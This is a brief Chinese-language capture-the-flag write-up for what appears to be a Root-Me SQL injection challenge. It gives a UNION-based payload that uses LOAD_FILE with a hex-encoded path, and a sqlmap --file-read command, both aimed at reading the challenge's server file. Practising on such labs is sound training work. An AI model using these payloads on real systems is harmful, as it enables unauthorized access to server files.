
## 方法一：UNION 水平越权漏洞

```sql
-8544 UNION ALL SELECT NULL,LOAD_FILE(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),NULL,NULL--
```

------

## 方法二：sqlmap

```shell
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --file-read /challenge/web-serveur/ch31/index.php
```
